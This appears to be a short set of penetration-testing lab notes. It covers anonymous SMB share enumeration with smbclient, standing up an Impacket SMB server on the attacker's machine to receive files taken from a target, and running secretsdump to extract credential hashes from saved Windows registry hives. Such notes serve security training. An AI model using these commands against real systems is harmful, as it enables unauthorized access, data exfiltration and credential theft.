

```smbclient -N -L \\10.129.42.253``` – List shares  
`smbclient \\10.129.42.253\users` – Access share 

##### in linux we use // forward slashes.

creating smb upload server 
run this command on the linux (own machine means attacker machine):
```shell-session
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

secretsdump command to extract:
```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```